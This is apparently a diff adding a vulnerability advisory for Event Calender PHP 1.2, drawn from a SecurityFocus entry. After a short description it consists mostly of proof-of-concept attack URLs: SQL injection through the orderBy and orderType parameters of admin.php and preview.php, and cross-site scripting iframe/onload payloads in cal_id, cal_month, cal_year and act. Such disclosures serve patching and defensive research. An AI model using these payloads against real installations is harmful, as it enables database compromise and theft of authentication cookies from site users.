@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/54455/info
+
+Event Calender PHP is prone to multiple input validation vulnerabilities.
+
+Exploiting these vulnerabilities could allow an attacker to execute arbitrary script code, steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Event Calender PHP 1.2 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/eventcalendar/admin.php?act=calendars&orderType=DESC&search=&orderBy=-1%27[SQL-INJECTION]cal_name&cal_id=2
+
+http://www.example.com/eventcalendar/admin.php?act=calendars&orderType=-1%27[SQL-INJECTION]&search=&orderBy=cal_name&cal_id=2
+
+http://www.example.com/eventcalendar/admin.php?act=events&orderType=ASC-1%27[SQL-INJECTION]&orderBy=event_title&cal_id=2
+
+http://www.example.com/eventcalendar/admin.php?act=events&orderType=ASC&orderBy=-1%27[SQL-INJECTION]event_title&cal_id=2
+
+http://www.example.com/preview.php?act=calendars&orderType=DESC&search=&orderBy=-1%27[SQL-INJECTION]cal_name&cal_id=2
+
+http://www.example.com/eventcalendar/admin.php?act=newCal&cal_id=2
+
+http://www.example.com/eventcalendar/admin.php?act=newEvent&cal_id=2
+
+http://www.example.com/eventcalendar/preview.php?cal_id=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C&cal_month=1&cal_year=0#oncal
+
+http://www.example.com/eventcalendar/preview.php?cal_id=2&cal_month=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C&cal_year=0#oncal
+
+http://www.example.com/eventcalendar/preview.php?cal_id=2&cal_month=1&cal_year=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C#oncal
+
+http://www.example.com/eventcalendar/admin.php?act=%22%3E%3Ciframe%20src=a%20onload=alert%28%22VL%22%29%20%3C 
